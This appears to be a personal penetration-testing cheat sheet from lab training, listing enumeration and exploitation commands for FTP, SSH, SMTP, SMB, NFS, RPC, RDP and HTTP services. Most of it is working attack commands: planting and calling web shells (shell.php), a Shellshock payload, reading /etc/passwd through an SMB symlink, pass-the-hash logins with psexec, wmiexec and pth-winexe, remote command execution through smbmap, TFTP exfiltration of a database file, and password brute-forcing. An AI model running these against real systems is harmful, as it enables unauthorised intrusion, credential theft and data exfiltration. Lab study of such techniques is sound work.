Enumeration

##########################################################################
##				METHODOLOGY			##
##########################################################################
1. Enumerate all open ports and services. 
2. Interact with services to detect service version.
3. Use searchsploit to find exploit available for service version detected.
4. Triage list of exploits/services on basis of priority/likelihood.
5. Test if exploit will be successful; do not spend too much time to avoid rabbit holes.
6. If exploit works, continue. If exploit fails, re-evaluate exploit and triage accordingly.

## ENUMERATION TIPS: 
# 	Google every service + exploit + OS build version if available
# 	Probe unknown ports and explore high-value targets--especially HTTP services
# 	Run Nmap NSE scripts against non-HTTP services during enumeration
# 	Check ping <IP> before anything more advanced then sudo tcpdump -i tun0 icmp

##########################################################################
##	ENUMERATION & EXPLOITATION						##
##########################################################################
// HOST IDENTIFICATION/PING SWEEP
nmap -sn -v0 10.11.1.1-254 | grep "scan report for" | grep -v 'down' | awk -F' ' '{print $5}'
nmap -sn -v0 10.11.1.1-254 -oG hosts.lst; grep Up hosts.lst | cut -d' ' -f2 | sort -V -o hosts.lst
sort -t . -k 3,3n -k 4,4n hosts.lst -o hosts.lst

// PORT SCANS
nmap --min-rate=1000 --max-retries=0 -sT -sU -4 <IP> -Pn > portscan
masscan -p1-65535,U:1-65535 <IP> --rate=1000 -e tun0
nmap -sT -sU <IP> -p <OPEN PORTS> -sV -sC -O -Pn > services
nmap -sT -sU <IP> -p <PORTS> --script=vuln -Pn > vulns
host=<IP>; for port in {1..65535}; do timeout .1 bash -c "echo >/dev/tcp/$host/$port" && echo "port $port is open"; done; echo "Done!"
autorecon <IP> 

// UNKNOWN SERVICE ENUMERATOR
nc -nvC <IP> <PORT>
telnet <IP> <PORT>

// FTP (:21/tcp) - PROBING & EXPLOITATION
# Authenticate as user 'anonymous' and password 'null'
# Use 'bin' to put binary, ASCII for text
ftp <IP>
passive
dir ../ #traversal
bin
put shell.php
get /etc/passwd
nmap -p21 -sVC <IP>
nmap -p21 --script ftp-brute <IP>


//DOMAIN 53

nslookup 
server IP
1)localhost
2)IP
3) guess

dnsrecon -r 127.0.0.0/24 
dnsrecon -r subnet/24
dig axfr @IP



 // SSH (:22/tcp) - PROBING & EXPLOITATION
	ssh <IP> -p <PORT>
	nc -nc <IP> 22
	telnet <IP> 22
	nmap -sVC <IP> -p22
	searchsploit SSH version  # check shellshock
	ssh -i noob noob@ip '() { :;}; /bin/bash'

// TELNET (:23/tcp) - PROBING & EXPLOITATION
telnet -l <user> <IP> 23
nmap -sVC -p23 <ip>
finger-user-enum.pl <OPTIONS> -u <USER> -t <IP>
finger-user-enum.pl <OPTIONS> -U USERS.txt -T HOSTS.txt

// SMTP (:25/tcp) - PROBING & EXPLOITATION
	nc -nvC <IP> 25
	VRFY root
	HELO <user>@<domain>.com
	listusers
	setpassword <USER> <PASSWORD>
	nmap -p25 --script smtp-vuln* <IP>
nmap -p25 --script smtp-enum-users <IP>
smtp-user-enum -M VRFY -U list.txt -t <IP>
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP>
smtp-user-enum -M EXPN -u unix_users.txt -t <IP>
smtp-user-enum -M EXPN -D <domain.com> -U unix_users.txt -t <IP>
finger -p "<USER>"
swaks --to <USER>@<DOMAIN>.local --from "<USER>@<DOMAIN>.local" --header "Subject: Status" --body body.txt --attach status.pdf --server <IP> --port 25 --auth LOGIN --auth-user "<USER>@<DOMAIN>.local" --auth-password <PASSWORD>

// TFTP (:69/udp) - EXFILTRATION
atftp -g -l MASTER.mdf  -r "C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf" 10.11.1.111
tftp <IP> 

// POP3 (:110/tcp) - PROBING & EXPLOITATION
nc -nvC <IP> 110
	USER <USER>
	PASS <PASSWORD>
	LIST
	RETR <#>
nmap -p110 --script pop3-capabilities <IP>
nmap -p110 --script pop3-brute <IP>

// SNMP (:161/udp)- PROBING
snmpwalk -c public -v1 -t 10 10.11.1.115
snmp-check -c public -v1 10.11.1.115
snmpenum -c public -v1 <IP> 1
snmpenum -t <IP>
onesixtyone -c private -i 10.11.1.115
metasploit use auxiliary/scanner/snmp/snmp_enum

// RDP (:3389/tcp) - PROBING & EXPLOITATION:
rdesktop <IP> -u <user> -p <password> -5 -K -r clipboard:CLIPBOARD -g 90% -r disk:E:=/tmp
xfreerdp /u:<USER> /p:<PASSWORD> /v:<IP> 
xfreerdp /u:<USER> /pth:<NTLM> /v:<IP> 

// WINRM (:5985/tcp)
evil-winrm -i 10.11.1.221 -u john -p easyas123

// SMB & NETBIOS (:139/tcp|:445/tcp) - PROBING & EXPLOITATION
nmap -p139,445 --script smb-vuln* <IP>
smbver.sh <IP> <PORT>
ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' &
nmblookup -A <IP> 										
enum4linux -a <IP>
nbtscan <IP>
smbmap -H <IP>
smbmap -u null -p "" -H 1<I{> -P <PORT> -R 2>&1
smbmap -d <DOMAIN> -u <USER> -p <PASSWORD> -H <IP>
smbmap -R <FOLDERNAME> -H <IP>
smbmap -u <USER> -p '<PASSWORD>' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H <IP> 	# RCE
echo exit | smbclient -L \\\\<IP>
smbclient -L <IP>
smbclient //<IP>/tmp
smbclient \\<IP>\IPC$ -U john
smbclient //MOUNT/ahare -l target -N
smbclient \\\\<IP>\\\\<SHARE>
smbclient -L -N -I <IP>
smbclient \\\\<IP>\\\<SHARE> --port=<PORT> --user=<USER> # e.g., guest, etc.
./smbclient //10.11.1.136/'Bob Share' -N 
	symlink / rootfs
smbclient //10.11.1.136/'Bob Share' -c 'lcd /home/kali/Desktop/; cd /rootfs/etc; get passwd' -N
smbclient //10.11.1.231/docs -c 'lcd /home/kali/Desktop/; cd /postfix; get changelog.Debian.gz' -N
smbclient //10.11.1.146/SusieShare -c 'lcd /home/kali/Desktop/shell.exe; put libpoc.so' -N
smbclient -N //10.11.1.231/docs
crackmapexec smb <IP>
crackmapexec smb <IP> -u <USER> -p <PASS> --shares 
psexec.py administrator@10.11.1.220
smbexec.py <USER>@<IP> -hashes <NTLM>
pth-winexe -U <USER>%<NTLM>:<NTLM> 
pth-winexe -U <USER> //<IP> cmd
impacket-wmiexec <USER>@<IP> -hashes <NTLM>:<NTLM>
impacket-wmiexec <DOMAIN>/<USER>:<NTLM>@<IP>
impacket-smbserver share /home/kali
impacket-smbserver share ~/Desktop
winexe -U <USER> //<IP> "cmd.exe" --system

// NFS (:111/tcp|:2049/tcp|:20048/tcp) - PROBING & EXPLOITATION
nmap -sV --script=nfs-showmount <IP>
df -k
mount -t nfs <IP>:/srv/Share /tmp/share
mount -t cifs -o username=<USER>,vers=1.0 //10.11.1.5/c$ /mnt
mount -o nolock 10.11.1.72:/home /mnt/nfs-share
mount -t cifs -o vers=1.0 //10.11.1.136/'Bob Share' /mnt/SUFFERANCE

// RPCBIND(:111/tcp) & MSRPC (:135/tcp) - PROBING & EXPLOITATION
rpcinfo -p <IP>
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
rpcinfo -s <IP>
rpcinfo -p <IP>
rpcclient -U "" -N <IP>
rpcclient -U "john" 10.11.1.221
rpcclient -U "" -N <IP> --command=enumprivs -N <IP>
showmount -a <IP>
showmount -e <IP>
showmount -d <IP>

// HTTP (:80/tcp|:443/tcp) - PROBING & EXPLOITATION
# /usr/share/dirb/wordlists/common.txt
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
# /usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt
curl http://<IP>:<PORT>/robots.txt
curl http://<IP>:<PORT>/sitemap.xml
dirsearch -r -f http://<IP>:<PORT> --extensions=htm,html,asp,aspx,txt,php,jsp,js,cgi w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --request-by-hostname -t 40 > dirsearch
gobuster dir -k -u http://<IP>:<PORT> -x "htm,html,asp,aspx,txt,php,jsp,js,cgi" -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -l -s "200,204,301,302,307" -o gobusted
nikto -host http://<IP>:<PORT> -C all -maxtime=30s -o nikto.txt
view-source:http://10.11.1.223/index.php?page=posts&post_id=69&com_status=open
curl 127.0.0.1:8080/manager/shell.jsp
curl -F "files=@shell.php" http://10.11.1.123/books/apps/jQuery-File-Upload/server/php/index.php
http://10.11.1.123/books/apps/jquery-file-upload/server/php/files/shell.php?cmd=shell.exe
https://beautifier.io/
wpscan --url 10.11.1.234 -v --detection-mode aggressive --enumerate ap,at,cb,dbe,u --api-token <MYTOKEN> --password-attack wp-login > wpscan
wpscan --url http://10.11.1.251/wp/ --wp-content-dir 10.11.1.251/wp/wp-content/ -v --enumerate ap,at,cb,dbe,u --password-attack wp-login > wpscan
whatweb <IP>
davest <IP>
nmap -p80 -sVC <IP>
nmap -p80 --script http-vuln* <IP>



